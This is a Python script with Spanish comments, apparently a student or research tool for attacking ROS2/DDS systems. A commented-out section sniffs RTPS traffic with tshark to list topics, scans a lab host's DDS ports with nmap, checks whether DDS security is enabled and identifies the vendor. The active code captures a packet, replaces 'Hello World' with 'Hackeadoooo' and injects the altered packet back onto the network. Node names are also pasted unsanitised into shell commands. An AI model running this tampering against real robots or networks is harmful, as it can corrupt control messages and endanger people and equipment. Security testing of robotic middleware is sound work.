from scapy.all import *
from prompt_toolkit import HTML, PromptSession
import os
import re
#import nmap
from prompt_toolkit import print_formatted_text as print

'''
############################################   TOPICS CAPTURANDO PAQUETES CON TSHARK     ######################################################################################################################
session = PromptSession()
print("Escribe yes para empezar con la captura de paquetes")
while (session.prompt() != "yes"):
    print("Escribe yes para empezar con la captura de paquetes")

tcpdump(prog=conf.prog.tshark, args=["-T", "json", "-f udp portrange 7412-7413", "-O RTPS", "-c 75", "-w", 'data.pcap'], dump=True, quiet=True)  # -c quiere decir cuátos paquetes capturar.
os.system("/bin/bash -c \"tshark -r data.pcap -T json > data.json\"")

os.system("/bin/bash -c \"rm data.pcap\"")

with open("data.json", 'r') as json_file:
    topic = re.findall("rt/(\w*)", json_file.read(), re.I | re.DOTALL) # Le indico que lo que viene después de un rt/ es el nombre del topic
    print(topic)

print(len(topic))
if len(topic) == 0: # Esto significa que no se ha podido capturar los topics pues sólo se envian al principio de la comunicación (En paquetes Discovery)
    print("No se ha podido capturar ningún topic")
else:
    topics_repetidos = [] #Esta lista auxiliar se usa para que no imprima topics repetidos
    for i in topic:
        if i not in topics_repetidos:
            topics_repetidos.append(i)
            print(i)

os.system("/bin/bash -c \"rm data.json\"")

#############################################################################################################################################################################################################


########################################### SACAR NUM DE NODOS #######################################################################################################################################
nm = nmap.PortScanner()

info_node = nm.scan(hosts="192.168.100.5", arguments='-p 7410-7440 -sU -n -T2 --open', sudo=True)
string_node = str(info_node.get('scan'))

if string_node != '{}':
    string_node = str(info_node.get('scan').get("192.168.100.5").get('udp'))

matches = re.findall("(\d{4})", string_node)
num_nodos = len(matches) // 2
lista_nodos = []

for i in range(num_nodos):
    lista_nodos.append([matches[0], matches[1]])
    matches = matches[2:]

print(lista_nodos)
#############################################################################################################################################################################################################

########################################### COMPROBAR SEGURIDAD #######################################################################################################################################
# Capturar paquete "tengo que ver cómo capturar solo los paquetes de datos, No los ACK ni nada de eso" ¿Tal vez filtrando por los bytes que tienen los paquetes de datos?
# Si nos obliga a ejecutar thsark con el usuario root, debemos añadir a nuestro usuario $USER al grupo de wireshark para evitar así ejecutar el fichero como root.
tcpdump(prog=conf.prog.tshark, args=["-T", "json", "-f udp portrange 7401-7500", "-O RTPS", "-c 10", "-w", 'data.pcap'], dump=True, quiet=True)  # -c quiere decir cuátos paquetes capturar.
os.system("/bin/bash -c \"tshark -r data.pcap -T json > data.json\"")
os.system("/bin/bash -c \"rm data.pcap\"")

with open("data.json", 'r') as json_file:
    check = re.search("Secure Data Tag", json_file.read(), re.I | re.DOTALL)

os.system("/bin/bash -c \"rm data.json\"")

if check is not None:
    print("Seguridad activada")
else:
    print("Seguridad no activada")

#############################################################################################################################################################################################################

########################################### DDS VENDORS ############################################################################################################################################################
lista_de_DDS_vendors = [
                        ["0x0101", "RTI Connext DDS (Real-Time Innovations, Inc)"],
                        ["0x0102", "OpenSplice DDS (ASLink Ltd)"],
                        ["0x0103", "OpenDDS (Object Computing Inc)"],
                        ["0x0104", "Mil-DDS (MilSoft)"],
                        ["0x0105", "InterCOM DDS (Kongsber)"],
                        ["0x0106", "CoreDX DDS (TwinOaks Computing, Inc)"],
                        ["0x0107", "Not Active (Lakota Technical Solutions, Inc)"],
                        ["0x0108", "Not Active (ICOUP Consulting)"],
                        ["0x0109", "Diamond DDS (ETRI)"],
                        ["0x010a", "RTI Connext DDS Micro (RTI)"],
                        ["0x010b", "Vortex Cafe (ADLink Ltd)"],
                        ["0x010c", "Not Active (PrismTech Ltd)"],
                        ["0x010d", "Vortex Lite (ADLink Ltd)"],
                        ["0x010e", "Qeo (Technicolor)"],
                        ["0x010f", "FastRTPS, FastDDS (eProsima)"],
                        ["0x0110", "Eclipse Cyclone DDS (Eclipse Foundation)"],
                        ["0x0111", "GurumDDS (Gurum Networks, Inc)"],
                        ["0x0112", "RustDDS (Atostek)"]
]

# Capturar paquete "tengo que ver cómo capturar solo los paquetes de datos, No los ACK ni nada de eso" ¿Tal vez filtrando por los bytes que tienen los paquetes de datos?
# Si nos obliga a ejecutar thsark con el usuario root, debemos añadir a nuestro usuario $USER al grupo de wireshark para evitar así ejecutar el fichero como root.
tcpdump(prog=conf.prog.tshark, args=["-T", "json", "-f udp portrange 7401-7500", "-O RTPS", "-c 10", "-w", 'data.pcap'], dump=True, quiet=True)  # -c quiere decir cuátos paquetes capturar.
os.system("/bin/bash -c \"tshark -r data.pcap -T json > data.json\"")
os.system("/bin/bash -c \"rm data.pcap\"")

with open("data.json", 'r') as json_file:
    vendorID = re.findall("vendorId\": \"(0x[\da-f]{4})", json_file.read(), re.I | re.DOTALL)
    
os.system("/bin/bash -c \"rm data.json\"")

for id in lista_de_DDS_vendors:
    if vendorID[0] == id[0]:
        print(id[1])
#############################################################################################################################################################################################################

############################################   TOPICS USANDO COMANDOS ROS2     ######################################################################################################################
os.system("/bin/bash -c \"source /opt/ros/humble/setup.bash && ros2 node list > node_names.txt\" ") # Por defecto se ejecuta una sh shell y queremos una bash

with open("node_names.txt", "r") as f:
    for line in f.read().splitlines(): # read().splitlines() para que no me lea también un salto de línea
        os.system("/bin/bash -c \"source /opt/ros/humble/setup.bash && ros2 node info "+line+" > "+line[1:]+".txt\"")

        with open(""+line[1:]+".txt", "r") as info_file:

            # Sacar los topic a los que esta suscrito un nodo
            topicSus = re.findall("Subscribers:\n(.*)Publishers", info_file.read(), re.I | re.DOTALL)

            topicSus = str(topicSus)[2:]
            topicSus = topicSus.split('\\n')
            print("Topics suscritos")
            for ts in topicSus[:len(topicSus) - 1]:
                print(ts.strip())

            # Sacar los topic a los que esta publicando un nodo
            #Como anteriormente he leído el fichero con read() ahora necesito poner el cursor de nuevo al principio del fichero y eso se hace con la función seek()
            info_file.seek(0)
            topicPub = re.findall("Publishers:\n(.*)Service Servers", info_file.read(), re.I | re.DOTALL)

            topicPub = str(topicPub)[2:]
            topicPub = topicPub.split('\\n')
            print("Topics publicando")
            for tp in topicPub[:len(topicPub) - 1]:
                print(tp.strip())

        os.system("/bin/bash -c \"rm "+line[1:]+".txt\"")
os.system("/bin/bash -c \"rm node_names.txt\"")
#############################################################################################################################################################################################################
###########################################     MODIFICAR UN PAQUETE Y REENVIARLO  ##################################################################################################################################
# Capturar paquete "tengo que ver cómo capturar solo los paquetes de datos, No los ACK ni nada de eso" ¿Tal vez filtrando por los bytes que tienen los paquetes de datos?
tcpdump(prog=conf.prog.tshark, args=["-T", "json", "-f udp portrange 7401-7500", "-O RTPS", "-c 1", "-w", 'data.pcap'], dump=True, quiet=True)  # -c quiere decir cuátos paquetes capturar.

# Reemplazar bytes de un paquete
import re

f = open('data.pcap', 'rb')
pkt_bytes = f.read()
f.close()

pkt_bytes = re.sub(b'(\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64)',  # Hello World
                   b'\x48\x61\x63\x6b\x65\x61\x64\x6f\x6f\x6f\x6f',  # Hackeadoooo
                   pkt_bytes)  # Para reemplazarlo deben tener los mismos bytes

f = open('data.pcap', 'wb')
f.write(pkt_bytes)
f.close()
####


# Enviar .pcap
packet = rdpcap("data.pcap")
sendp(packet)
#############################################################################################################################################################################################################
'''
###########################################     MODIFICAR UN PAQUETE Y REENVIARLO  ##################################################################################################################################
# Capturar paquete "tengo que ver cómo capturar solo los paquetes de datos, No los ACK ni nada de eso" ¿Tal vez filtrando por los bytes que tienen los paquetes de datos?
tcpdump(prog=conf.prog.tshark, args=["-T", "json", "-f udp portrange 7401-7500", "-O RTPS", "-c 1", "-w", 'data.pcap'], dump=True, quiet=True)  # -c quiere decir cuátos paquetes capturar.

# Reemplazar bytes de un paquete
import re

f = open('data.pcap', 'rb')
pkt_bytes = f.read()
f.close()

pkt_bytes = re.sub(b'(\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64)',  # Hello World
                   b'\x48\x61\x63\x6b\x65\x61\x64\x6f\x6f\x6f\x6f',  # Hackeadoooo
                   pkt_bytes)  # Para reemplazarlo deben tener los mismos bytes

f = open('data.pcap', 'wb')
f.write(pkt_bytes)
f.close()
####


# Enviar .pcap
packet = rdpcap("data.pcap")
sendp(packet)



